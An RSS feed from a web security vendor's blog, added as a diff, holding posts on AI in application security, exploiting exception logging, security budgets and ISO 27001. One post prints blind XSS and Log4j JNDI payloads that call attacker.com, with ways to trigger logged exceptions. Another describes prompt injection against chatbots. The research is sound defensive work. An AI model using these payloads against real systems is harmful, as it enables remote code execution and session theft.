@@ -1,0 +1,954 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/">
+  <channel>
+    <title>Invicti</title>
+    <atom:link href="https://www.invicti.com/blog/feed/" rel="self" type="application/rss+xml" />
+    <link>https://www.invicti.com/</link>
+    <description>Web Application Security For Enterprise</description>
+    <lastBuildDate>Fri, 07 Apr 2023 11:32:42 +0000</lastBuildDate>
+    <language>en-US</language>
+    <sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+    <sy:updateFrequency>
+	1	</sy:updateFrequency>
+    <image>
+      <url>https://cdn.invicti.com/app/uploads/2022/03/08125959/cropped-favicon-32x32.png</url>
+      <title>Invicti</title>
+      <link>https://www.invicti.com/</link>
+      <width>32</width>
+      <height>32</height>
+    </image>
+    <item>
+      <title>Getting real on AI in application security</title>
+      <link>https://www.invicti.com/blog/web-security/getting-real-on-ai-in-application-security/</link>
+      <dc:creator><![CDATA[Zbigniew Banach]]></dc:creator>
+      <pubDate>Fri, 07 Apr 2023 11:32:42 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[application-security]]></category>
+      <category><![CDATA[ai-security]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39529</guid>
+      <description><![CDATA[<p>As the AI feeding frenzy continues, there is a lot of speculation and scaremongering out there, especially in terms of security. This post sets the record straight on some of the crucial ways that AI relates to application security, based on the points raised by Invicti’s Frank Catucci on Application Security Weekly #234.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/getting-real-on-ai-in-application-security/">Getting real on AI in application security</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p>AI is definitely the hot topic right now, and a lot of people are throwing around or downright parroting information and opinions. Invicti’s CTO and Head of Security Research, Frank Catucci, spoke to Mike Shema on episode #234 of the Application Security Weekly cybersecurity podcast to discuss what, realistically, AI means for application security today and in the nearest future. Watch the full video below and read on to get an overview of AI as it currently relates to application security – and to learn about the brand-new art of hallucination squatting.</p>
+
+
+
+<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
+<iframe title="Real-life Examples. Benefits, Risk &amp; Security Implications of AI - Frank Catucci - ASW #234" width="500" height="281" src="https://www.youtube.com/embed/8J4nyJFlFKU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+</div></figure>
+
+
+
+<h2>Faster, easier to use, and rife with risk</h2>
+
+
+
+<p>For all the hype around large language models (LLMs) and generative AI in recent months, the underlying technologies have been around for years, with the tipping point brought about by relatively minor tweaks that have made AI more accessible and useful. While nothing has fundamentally changed on the technical side, the big realization is that AI is here to stay and set to develop even faster, so we really need to understand it and think through all the implications and use cases. In fact, industry leaders recently signed an <a href="https://futureoflife.org/open-letter/pause-giant-ai-experiments/" target="_blank" rel="noreferrer noopener nofollow">open letter</a> calling for a 6-month pause in developing models more powerful than GPT-4 until the risks are better understood.</p>
+
+
+
+<p>As AI continues to evolve and get used far more often and in more fields, considerations like responsible usage, privacy, and security become extremely important if we’re to understand the risks and plan for them ahead of time rather than scrambling to deal with incidents after the fact. Hardly a day goes by without another controversy related to ChatGPT data privacy, whether it’s the bot <a href="https://openai.com/blog/march-20-chatgpt-outage" target="_blank" rel="noreferrer noopener nofollow">leaking user information</a> or being <a href="https://gizmodo.com/chatgpt-ai-samsung-employees-leak-data-1850307376" target="_blank" rel="noreferrer noopener nofollow">fed proprietary data in queries</a> with no clear indication of how that information is processed and who might see it. These concerns are compounded by the growing awareness that the bot is trained on publicly-accessible web data, so despite intense administrative efforts, you can never be sure what could be revealed.</p>
+
+
+
+<h2>Attacking the bots: Prompt injection and more</h2>
+
+
+
+<p>With conversational AI such as ChatGPT, prompts entered by users are the main inputs to the application – and in cybersecurity, when we see “input,” we think “attack surface.” Unsurprisingly, prompt injection attacks are the latest hot area in security research. There are at least two main directions to explore: crafting prompts that extract data the bot was not supposed to expose and applying existing injection attacks to AI prompts.</p>
+
+
+
+<p>The first area is about bypassing or modifying guardrails and rules defined by the developers and administrators of a conversational AI. In this context, prompt injection is all about crafting queries that will cause the bot to work in ways it was not intended to. Invicti’s own <a href="https://www.invicti.com/blog/author/svenmorgenroth/">Sven Morgenroth</a> has created a dedicated <a href="https://github.com/svenmorgenrothio/Prompt-Injection-Playground" target="_blank" rel="noreferrer noopener nofollow">prompt injection playground</a> for testing and developing such prompt injection attacks in controlled circumstances in an isolated environment.</p>
+
+
+
+<p>The second type of prompt injection involves treating prompts like any other user input to inject attack payloads. If an application doesn’t sanitize AI prompts before processing, it could be vulnerable to <a href="https://www.invicti.com/learn/cross-site-scripting-xss/">cross-site scripting (XSS)</a> and other well-known attacks. Considering that ChatGPT is also commonly asked about (and for) application code, input sanitization is particularly difficult. If successful, such attacks could be far more dangerous than prompts to extract sensitive data, as they could compromise the system the bot runs on.</p>
+
+
+
+<h2>The many caveats of AI-generated application code</h2>
+
+
+
+<p>AI-generated code is a whole separate can of worms, with tools such as GitHub Copilot now capable not only of autocompletion but of writing entire code blocks that save developers time and effort. Among the many caveats is security, with Invicti’s own research on <a href="https://www.invicti.com/blog/web-security/analyzing-security-github-copilot-suggestions/">insecure Copilot suggestions</a> showing that the generated code often cannot be implemented as-is without exposing critical vulnerabilities. This makes routine security testing with tools like <a href="https://www.invicti.com/learn/dynamic-application-security-testing-dast/">DAST</a> and <a href="https://www.invicti.com/learn/static-application-security-testing-sast/">SAST</a> even more important, as it’s extremely likely that such code will make its way into projects sooner or later.</p>
+
+
+
+<p>Again, this is not a completely new risk, since pasting and adapting code snippets from Stack Overflow and similar sites has been a common part of development for years. The difference is the speed, ease of use, and sheer scale of AI suggestions. With a snippet found somewhere online, you would need to understand it and modify it to your specific situation, typically working with only a few lines of code. But with an AI-generated suggestion, you could be getting hundreds of lines of code that (superficially at least) seems to work, making it much harder to get familiar with what you’re getting – and often removing the need to do so. The efficiency gains can be huge, so the pressure to use that code is there and will only grow, at the cost of knowing less and less of what goes on under the hood.</p>
+
+
+
+<p>Vulnerabilities are only one risk associated with machine-generated code, and possibly not even the most impactful. With the renewed focus in 2022 on securing and controlling software supply chains, the realization that some of your first-party code might actually come from an AI trained on someone else’s code will be a cold shower for many. What about license compliance if your commercial project is found to include AI-generated code that is identical to an open-source library? Will that need attribution? Or open-sourcing your own library? Do you even have copyright if your code was machine-generated? Will we need separate software bills of materials (SBOMs) detailing AI-generated code? Existing tools and processes for <a href="https://www.invicti.com/learn/software-composition-analysis-sca/">software composition analysis (SCA)</a> and checking license compliance might not be ready to deal with all that.</p>
+
+
+
+<h2>Hallucination squatting is a thing (or will be)</h2>
+
+
+
+<p>Everyone keeps experimenting with ChatGPT, but at Invicti, we’re always keeping our eyes open for unusual and exploitable behaviors. In the discussion, Frank Catucci recounts a fascinating story that illustrates this. One of our team was looking for an existing Python library to do some very specific JSON operations and decided to ask ChatGPT rather than a search engine. The bot very helpfully suggested three libraries that seemed perfect for the job – until it turned out that none of them really existed, and all were invented (or hallucinated, as Mike Shema put it) by the AI.</p>
+
+
+
+<p>That got the researchers thinking: If the bot is recommending non-existent libraries to us, then other people are likely to get the same recommendations and go looking. To check this, they took one of the fabricated library names, created an actual open-source project under that name (without putting any code in it), and monitored the repository. Sure enough, within days, the project was getting some visits, hinting at the future risk of AI suggestions leading users to malicious code. By analogy to typosquatting (where malicious sites are set up under domains corresponding to the mistyped domain names of high-traffic sites), this could be called hallucination squatting: deliberately creating open-source projects to imitate non-existent packages suggested by an AI.</p>
+
+
+
+<p>And if you think that’s just a curiosity with an amusing name (which it is), imagine Copilot or a similar code generator actually importing such hallucinated libraries in its code suggestions. If the library doesn’t exist, the code won’t work – but if a malicious actor is squatting on that name, you could be importing malicious code into your business application without even knowing it.</p>
+
+
+
+<h2>Using AI/ML in application security products</h2>
+
+
+
+<p>Many companies have been jumping on the AI bandwagon in recent months, but at Invicti, we’ve been using more traditional and predictable machine learning (ML) techniques for years to improve our products and processes internally. As Frank Catucci said, we routinely analyze anonymized data from the millions of scans on our cloud platform to learn how customers use our products and where we can improve performance and accuracy. One way that we use AI/ML to improve user outcomes is to help prioritize vulnerability reports, especially in large environments.</p>
+
+
+
+<p>In enterprise settings, some of our customers routinely scan thousands of endpoints, meaning websites, applications, services, and APIs, all adding up to massive numbers. We use machine learning to suggest to users which of these assets should be prioritized based on the risk profile, considering multiple aspects like identified technologies and components but also the page structure and content. This type of assistant can be a massive time-saver when looking at many thousands of issues that you need to triage and address across all your web environments. When improving this model, we’ve had cases where we started with somewhere like 6000 issues and managed to pick out the most important 200 or so at a level of confidence in the region of 85%, and that makes the process that much more manageable for the users.</p>
+
+
+
+<h2>Accurate AI starts with input from human experts</h2>
+
+
+
+<p>When trying to accurately assess real-life risk, you really need to start with training data from human experts because AI is only as good as its training set. Some Invicti security researchers, like <a href="https://www.invicti.com/blog/author/bogdancalin/">Bogdan Calin</a>, are active bounty hunters, so in improving this risk assessment functionality, they correlate the weights of specific vulnerabilities with what they are seeing in bounty programs. This also helps to narrow down the real-life impact of a vulnerability in context. As Frank Catucci stated, a lot of that work is actually about filtering out valid warnings about outdated or known-vulnerable components that are not a high risk in context. For example, if a specific page doesn’t accept much user input, having an outdated version of, say, jQuery will not be a priority issue there, so that result can move further down the list.</p>
+
+
+
+<p>But will there come a time when AI can take over some or all of the security testing from penetration testers and security engineers? While we’re still far from fully autonomous AI-powered penetration testing (and even bounty submissions), there’s no question that the new search and code generation capabilities are being used by testers, researchers, and attackers. Getting answers to things like “code me a bypass for such and such web application firewall” or “find me an exploit for product and version XYZ” can be a huge time-saver compared to trial and error or even a traditional web search, but it’s still fundamentally a manual process.</p>
+
+
+
+<h2>Known risks and capabilities – amplified</h2>
+
+
+
+<p>The current hype cycle might suggest that Skynet is just around the corner, but in reality, what seems an AI explosion merely amplifies existing security risks and puts a different twist on them. The key to getting the best out of the available AI technologies (and avoiding the worst) is to truly understand what they can and cannot do – or be tricked into doing. And ultimately, they are only computer programs written by humans and trained by humans on vast sets of data generated by humans. It’s up to us to decide who is in control.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/getting-real-on-ai-in-application-security/">Getting real on AI in application security</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Exploiting insecure exception logging</title>
+      <link>https://www.invicti.com/blog/web-security/exploiting-insecure-exception-logging/</link>
+      <dc:creator><![CDATA[Bogdan Calin]]></dc:creator>
+      <pubDate>Wed, 05 Apr 2023 15:17:54 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[web-application-security]]></category>
+      <category><![CDATA[vulnerabilities]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39461</guid>
+      <description><![CDATA[<p>Keeping and monitoring application error logs is a fundamental practice for ensuring performance and security. But what if someone could deliberately cause errors to route their attack payloads through insecure exception logging functionality? Invicti’s Principal Security Researcher Bogdan Calin describes using this approach as a novel way of finding and exploiting vulnerabilities in internal dashboards.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/exploiting-insecure-exception-logging/">Exploiting insecure exception logging</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p>When your web application receives a request that causes an exception, you usually want to log that request for further analysis. But what if the request contains an attack payload? If you don’t sanitize the request data before logging, it could trigger vulnerabilities in back-end systems such as admin dashboards. Intrigued by an accidental finding during scanning, I decided to investigate this technique.</p>
+
+
+
+<h2>A happy accident: Discovering an exception-triggered vulnerability</h2>
+
+
+
+<p>Before we go into the details, here is how it all began. A while back, I scanned a test website using the Acunetix web security scanner and after the scan completed, I got a notification about a <a href="https://www.invicti.com/learn/blind-cross-site-scripting/">blind cross-site scripting (XSS)</a> vulnerability. Investigating the issue, I discovered that while running its security checks for blind XSS vulnerabilities, Acunetix had generated an exception in the application. The exception was then logged into an admin panel without proper HTML encoding – and my visit to this panel triggered the vulnerability.</p>
+
+
+
+<p>This type of vulnerability was unique in that it was discovered unintentionally when an Acunetix blind XSS payload generated an exception. It also differed from a typical blind XSS vulnerability because normal application events are not logged into the admin panel, so an exception had to be generated before the vulnerability could be exploited.</p>
+
+
+
+<p>The finding got me thinking about application exceptions – and especially about the possibilities of generating them intentionally to exploit similar vulnerabilities when exception data is logged and loaded without sanitization.</p>
+
+
+
+<h2>The usefulness and dangers of exception logging</h2>
+
+
+
+<p>In general, web application exceptions are unexpected events or errors that may occur as a web application executes, often resulting from coding errors, hardware failures, or network issues. Detailed logging of application exceptions is essential to efficient application development. Whenever an exception occurs, it can provide developers with valuable information about a defect and ways to fix it, so exception logging is extremely useful for recording the type, location, and time of an issue, along with relevant error messages and stack traces.</p>
+
+
+
+<p>It is common practice to log the HTTP request responsible for generating an exception. Because the exception data is typically only displayed within internal dashboards that developers do not consider to be a significant security risk, the logged data might not be properly encoded or sanitized. If an application logs exceptions that contain user-controlled data, such as input parameters, raw HTTP requests, or error messages, attackers could try and exploit this by injecting malicious code that would only execute when developers or administrators view the exception logs.</p>
+
+
+
+<p>To slip a malicious payload into exception logs to be triggered later, attackers could use a variety of exceptional conditions, such as deliberately sending requests with invalid headers or large numbers of requests. Depending on the specific vulnerability that is triggered, an attacker might be able to perform actions on behalf of the user, such as stealing session tokens or injecting client-side JavaScript for a blind XSS attack. If a <a href="https://www.invicti.com/blog/web-security/is-log4shell-worst-software-vulnerability-ever/">Log4j-related vulnerability</a> exists, attackers could even execute arbitrary server-side code.</p>
+
+
+
+<h2>Proving the concept by finding a real-life vulnerability</h2>
+
+
+
+<p>Using techniques described in the next section, I developed several practical attacks that allowed me to discover vulnerabilities in various bug bounty programs, including one that affected a renowned Fortune 100 company. After sending multiple requests intended to generate exceptions, I finally received a hit for a blind XSS vulnerability that existed in an internal monitoring system of the company.</p>
+
+
+
+<p>With my blind XSS payload, I managed to extract HTML DOM content which revealed that my requests had triggered an event called <code>Bad Request Spike</code>. The event was insecurely logged on the company’s internal dashboard. Because the recorded value of the <code>User-Agent</code> header was not being properly HTML-encoded, it was directly reflected in the HTML DOM, allowing attackers to inject and execute arbitrary JavaScript code.</p>
+
+
+
+<p>The consequences of a real attack exploiting this vulnerability could be very serious. Even if the application itself is not directly vulnerable to other attacks and the administrative dashboard is not externally accessible, an exception-triggered blind XSS vulnerability still makes it possible to inject arbitrary JavaScript.</p>
+
+
+
+<p>Apart from XSS as used in this case, I discovered that the same payloads could also be used to find and exploit vulnerabilities in Log4j. The technique was identical, but the impact was far more severe, potentially allowing for <a href="https://www.invicti.com/learn/remote-code-execution-rce/">remote code execution (RCE)</a> on a back-end system.</p>
+
+
+
+<h2>Examples of exception-triggered payloads</h2>
+
+
+
+<p>To develop the initial idea, I began manually testing bug bounty applications for various vulnerabilities of this type – and discovered some intriguing security issues. Below are some combination payloads that incorporate both blind XSS and Log4j (in red). Injection points can include headers, parameters, and paths (the more, the better), though I generally found the most success in injecting the <code>User-Agent</code> and <code>Referer</code><strong> </strong>headers:</p>
+
+
+
+<pre class="wp-block-code is-style-default"><code>User-Agent: <b style="color:red">${jndi:ldap://attacker.com/log4j/1}</b>'"&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/template&gt;&lt;/script&gt;&lt;script/src="//attacker.com/bxss/1"&gt;&lt;/script&gt;
+
+Referer: <b style="color:red">${jndi:ldap://attacker.com/log4j/2}</b>'"&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/template&gt;&lt;/script&gt;&lt;script/src="//attacker.com/bxss/2"&gt;&lt;/script&gt;
+
+Origin: <b style="color:red">${jndi:ldap://attacker.com/log4j/3}</b>'"&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/template&gt;&lt;/script&gt;&lt;script/src="//attacker.com/bxss/3"&gt;&lt;/script&gt;</code></pre>
+
+
+
+<h2>Error conditions used to trigger vulnerabilities</h2>
+
+
+
+<p>There are many ways to cause an exception in the hope that it will be insecurely logged. Here is a list of some of the error conditions that I’ve found useful in testing for triggering payloads:</p>
+
+
+
+<ul>
+<li><strong>Invalid Host header</strong>: Make an HTTP/S request to the IP address of the application but provide an invalid host header to trigger an exception. Here is an example of a full HTTP request that can be used to generate an invalid host header injection:</li>
+</ul>
+
+
+<div class="wp-block-image is-style-default">
+<figure class="aligncenter size-large is-resized"><img decoding="async" src="https://cdn.invicti.com/app/uploads/2023/04/05111357/image-1024x179.png" alt="" class="wp-image-39465" width="800" srcset="https://cdn.invicti.com/app/uploads/2023/04/05111357/image-1024x179.png 1024w, https://cdn.invicti.com/app/uploads/2023/04/05111357/image-300x53.png 300w, https://cdn.invicti.com/app/uploads/2023/04/05111357/image-768x134.png 768w, https://cdn.invicti.com/app/uploads/2023/04/05111357/image-1536x269.png 1536w, https://cdn.invicti.com/app/uploads/2023/04/05111357/image.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>
+
+
+<ul>
+<li><strong>Invalid HTTP method</strong>: Use an invalid HTTP method that may not be properly handled by the web application.</li>
+
+
+
+<li><strong>Request without a User-agent header</strong>: The HTTP request doesn’t contain a <code>User-agent</code> header.</li>
+
+
+
+<li><strong>Request with a known bad User-agent header</strong>: The HTTP request contains a <code>User-agent</code> header that is widely used in attacks, such as <code>sqlmap/1.3.11#stable (http://sqlmap.org)</code>.</li>
+
+
+
+<li><strong>POST body with GET method</strong>: Send an HTTP request using the GET method but with a POST message body.</li>
+
+
+
+<li><strong>High number of 404 Not found errors</strong>: A lot of websites have protections against automated scanners that trigger when a high number of <code>404 Not found</code> errors are detected. We might use this to our advantage to request a large number of invalid paths and inject our payloads into the HTTP headers.</li>
+
+
+
+<li><strong>High number of 500 Internal Server errors</strong>: Similar to the previous method, but in this case, we need to find an unsupported condition in the web application that will generate a <code>500 Internal server error</code>, and then make a large number of such requests.</li>
+
+
+
+<li><strong>Large number of failed login attempts</strong>: Identify a login form and try different behaviors that should trigger an exception, like sending a large number of passwords with a valid username or sending a large number of invalid usernames and passwords.</li>
+
+
+
+<li><strong>Large number of requests in a short period</strong>: Send a large number of requests in a short period of time (e.g. 2000 requests in 5 minutes).</li>
+</ul>
+
+
+
+<h2>The future of exception-triggered vulnerabilities</h2>
+
+
+
+<p>The techniques described here rely on deliberately generating application exceptions as a way to store various attack payloads in exception logs. Because the logs are only intended for developers and administrators, logged request data might not be sanitized in the same way as more expected user-controlled data. This opens a whole new avenue for testing and attacks on back-end systems.</p>
+
+
+
+<p>While this post only describes examples for blind XSS and RCE via Log4j, the same methods could potentially be used to exploit other vulnerabilities in internal dashboards. From an application security standpoint, the most important lesson is that all request data logged with exceptions needs to be sanitized and encoded to the same standard as other user inputs.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/exploiting-insecure-exception-logging/">Exploiting insecure exception logging</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Baking AppSec into your cybersecurity budget: A recipe for efficient risk reduction</title>
+      <link>https://www.invicti.com/blog/web-security/recipe-for-baking-application-security-into-cybersecurity-budget/</link>
+      <dc:creator><![CDATA[Meaghan McBee]]></dc:creator>
+      <pubDate>Fri, 31 Mar 2023 14:11:00 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[web-application-security]]></category>
+      <category><![CDATA[cybersecurity-budget]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39417</guid>
+      <description><![CDATA[<p>Betting big on cybersecurity this year? With a carefully planned budget for application scanning tools, you can reduce risk, prepare employees, and boost customer confidence – all without wasting a penny.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/recipe-for-baking-application-security-into-cybersecurity-budget/">Baking AppSec into your cybersecurity budget: A recipe for efficient risk reduction</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p>When organizations approach cybersecurity without sufficient forethought, financial support, reliable tools, and a strong strategy, they might actually increase their overall security risk by failing to protect and shrink their entire attack surface. With a more proactive approach backed by a robust budget, getting ahead of costly breaches and sensitive information leaks is a much more manageable feat.&nbsp;</p>
+
+
+
+<p>The prevalence of web applications in today’s digital age is off the charts – there are over <a href="https://techjury.net/blog/how-many-websites-are-there/#gref" target="_blank" rel="noreferrer noopener nofollow">5 billion active internet users</a> in the world operating on about 2 billion websites and web applications. These web apps are relied on by businesses large and small for a variety of crucial tasks, like managing sensitive financial records, storing customer information, and processing business-critical operations and data on a regular basis. Unsurprisingly, these applications are also prime targets for cyberattacks that can result in data breaches, lost revenue, damage to brand reputation, and even legal implications if the organization is found at fault. Let’s look at some numbers:</p>
+
+
+
+<ul>
+<li>The average cost of a data breach, <a href="https://www.ibm.com/security/data-breach" target="_blank" rel="noreferrer noopener nofollow">according to IBM</a>, is a hefty $4.35 million, and in the U.S. alone, that number tops $9 million on average. </li>
+
+
+
+<li>The Identity Theft Research Center’s (ITRC) 2022 <a href="https://www.idtheftcenter.org/publication/2022-data-breach-report/" target="_blank" rel="noreferrer noopener nofollow">Annual Data Breach Report</a> highlights that at least 422 million individuals were impacted by data compromises in a single year. </li>
+
+
+
+<li>There was a potential total loss increase from $6.9 billion to $10.2 billion in 2022, as outlined in the FBI’s <a href="https://www.ic3.gov/Media/PDF/AnnualReport/2022_IC3Report.pdf" target="_blank" rel="noreferrer noopener nofollow">Internet Crime Report 2022</a>, with 800,944 complaints of cybercrime.</li>
+
+
+
+<li>Financial damage from cyberattacks will likely hit about <a href="https://cybersecurityventures.com/hackerpocalypse-cybercrime-report-2016/" target="_blank" rel="noreferrer noopener nofollow">$10.5 trillion</a> by 2025, which is a 300% increase from where we were in 2015. </li>
+</ul>
+
+
+
+<p>To avoid such a costly price tag, it’s vital that you have a robust cybersecurity program to get ahead of the bad guys – and stay ahead – by controlling and reducing your threat exposure. But without thoughtful investment in the tools and managed services that can take you there, your program could be lacking in critical areas to help close security gaps throughout the software development lifecycle (SDLC).&nbsp;</p>
+
+
+
+<p>As businesses and budgets grow, so does the risk of not getting enough bang for your cybersecurity buck, meaning you could be spending more but achieving less. What’s more, business expansion increases the number of stakeholders and subsidiaries in the mix of operations, putting customers, suppliers, and partners in the crosshairs by proxy. Increased complexity also increases the criticality of businesses investing in the right web application security measures to cover their growing attack surfaces while ensuring the right level of access for all employees and partners. </p>
+
+
+
+<h2>When it comes to application security, reactive is more costly than proactive</h2>
+
+
+
+<p>In its <a href="https://www.ibm.com/security/data-breach" target="_blank" rel="noreferrer noopener nofollow">Cost of a Data Breach 2022</a> report, IBM noted that it takes an average of 277 days for security teams to identify, contain, and manage a breach. When teams are set up with the right tools, processes, and reliable resources in hand to squash security issues well before applications are sent out into the world, that number can shrink drastically, as proactive preparedness means they know exactly what they need to do when a problem arises. And when proactive security is done well, breaches shouldn’t even happen in the first place. </p>
+
+
+
+<p>Being proactive is even more critical when businesses are expanding their offered services, absorbing more customers quickly, and adding partners or subsidiaries. As the business evolves and grows, so does the entire risk ecosystem, so ensuring that everything under your organizational umbrella is secure becomes a top priority. This means not just checking for security flaws early and often with application scanning tools – you also need to tackle issues with legacy applications that might have lingering vulnerabilities, keep paying down your security debt to alleviate risk and support security best practices for employees.&nbsp;</p>
+
+
+
+<h2>Attack surfaces keep growing regardless of company size</h2>
+
+
+
+<p>We know from Verizon’s 2022 Data Breach Investigations Report (<a href="https://www.verizon.com/business/resources/reports/dbir" target="_blank" rel="noreferrer noopener nofollow">DBIR</a>) that web applications are the number one attack vector for cyberattacks, and even worse, personal data or credentials are compromised in nearly 70% of cyber incidents. We also know from additional research that nearly half (<a href="https://www.accenture.com/content/dam/accenture/final/a-com-migration/custom/us-en/invest-cyber-resilience/pdf/Accenture-State-Of-Cybersecurity-2021.pdf#zoom=40" target="_blank" rel="noreferrer noopener nofollow">43%</a>) of attacks are aimed at small to medium-sized businesses (SMBs) – but a mere 14% of those businesses are prepared to defend themselves.</p>
+
+
+
+<p>Whether a large organization or a small startup, your data is valuable. You’re also running (and usually building) web applications, making you a potential target – and your customers as well. This is especially true for organizations enjoying rapid growth and the expanded digital ecosystems that naturally come with success, as risk and potential exposure can bloom wherever digital touchpoints are established. And with the global cost of cyberattacks potentially hitting $10 trillion in the coming years, forgoing security isn’t a risk that any organization should take.&nbsp;</p>
+
+
+
+<h2>Compliance and regulatory pressures are growing year by year</h2>
+
+
+
+<p>There have been a handful of compliance regulations and guidelines handed out by the United States government in recent months and years, from the <a href="https://www.invicti.com/blog/web-security/first-anniversary-biden-executive-order-cybersecurity/">Executive Order on Cybersecurity</a> to a <a href="https://www.invicti.com/blog/web-security/zero-trust-countdown-omb-memo-stresses-urgency-modern-appsec/">zero trust memo</a> from the Office of Management and Budget (OMB). On the tailwinds of industry-shaking incidents like SolarWinds, which involved a supply chain attack, federal mandates are stark reminders that real damage can be done to any organization.&nbsp;</p>
+
+
+
+<p>In fact, <a href="https://www.gartner.com/en/articles/7-top-trends-in-cybersecurity-for-2022" target="_blank" rel="noreferrer noopener nofollow">Gartner predicts</a> that by 2025, 45% of organizations will see some sort of impact from a supply chain attack. A healthy and well-structured cybersecurity budget allows organizations to follow these federal mandates and guidelines closely, implementing the same security measures and best practices to ensure they’re taking the right guidance. As threats increase for the supply chain and other critical avenues of software distribution, having the financial muscle in your budget to keep up with regulations and compliance means you can address not only your own security but also that of your customers and partners. </p>
+
+
+
+<h2>Building a security culture needs a hands-on approach from leadership</h2>
+
+
+
+<p>Critical as it is to ensure you’re investing in the right security application scanning tools and management tools, it’s equally important to remember the human element. Ignoring human fallacy and knowledge gaps can result in real damage, with Verizon’s DBIR report tracing the causes of <a href="https://www.verizon.com/business/resources/reports/dbir/" target="_blank" rel="noreferrer noopener nofollow">82% of data breaches</a> to human error or human action. </p>
+
+
+
+<p>Getting ahead of this issue requires top-down leadership initiatives to create a security culture and invest in the right talent along the way. Steering the security ship for the entire organization is a challenge without effective guidance and without the requisite resources proactively baked into your cybersecurity budget. For example, the CISO should fully understand the company’s threat landscape and potential risks, taking a very hands-on role in disseminating information about security tools and best practices throughout the rest of the organization. With that authority to point the way, all employees can then approach security with confidence.&nbsp;</p>
+
+
+
+<p>Employees cannot skirt the rules set down by security leaders, or the entire organization is at risk. Just as a simple phishing attack via email can open the way to a more damaging attack and allow bad actors to infiltrate company systems, having inadequate or inconvenient application security tools can result in exploitable vulnerabilities making it into production. Investing in role-specific security training to improve culture and embedding the right tools into sensitive systems and processes is proactive security in action.</p>
+
+
+
+<p>To learn more about rationally choosing a web application security solution based on no less than 17 criteria, get our free <a href="https://www.invicti.com/clp/resources/buyers-guide/">Web Application Security Buyer’s Guide</a>.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/recipe-for-baking-application-security-into-cybersecurity-budget/">Baking AppSec into your cybersecurity budget: A recipe for efficient risk reduction</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>All your code is not your own: Securing third-party code for ISO 27001 compliance</title>
+      <link>https://www.invicti.com/blog/web-security/securing-third-party-code-for-iso-27001-compliance/</link>
+      <dc:creator><![CDATA[Julie Anderson]]></dc:creator>
+      <pubDate>Tue, 28 Mar 2023 13:00:00 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[iso-27001]]></category>
+      <category><![CDATA[third-party-code]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39311</guid>
+      <description><![CDATA[<p>Securing third-party code that makes up the majority of any modern web application is always a challenge – and even more so if you want ISO 27001 compliance. The current edition of the standard specifies security requirements across the entire lifecycle of third-party code.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/securing-third-party-code-for-iso-27001-compliance/">All your code is not your own: Securing third-party code for ISO 27001 compliance</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<blockquote class="wp-block-quote is-style-default">
+<p><strong>Key takeaways</strong></p>
+
+
+
+<p>&nbsp;</p>
+
+
+
+<ul>
+<li>The ISO 27001/27002 information security and privacy standards require organizations to negotiate responsibilities with an outsourcing supplier for delivering secure code.</li>
+
+
+
+<li>Requirements include testing the security of third-party libraries even where there is no access to code, so DAST and manual penetration testing are essential.&nbsp;</li>
+
+
+
+<li>The standards also stipulate working in partnership with your cloud service provider to secure the application platform.</li>
+</ul>
+</blockquote>
+
+
+
+<p>You probably already know that all your code is not your own. In fact, the vast majority of application code consists of open-source and third-party libraries and outsourced code alongside code developed in-house. Moreover, not only do you not own all your application code, but the platform on which the application runs is also third-party software: cloud services, web servers, networking software, and operating systems. Yet if there’s a data breach, your customers don’t care whether some third party wrote the software that was compromised – they’ll hold you responsible. </p>
+
+
+
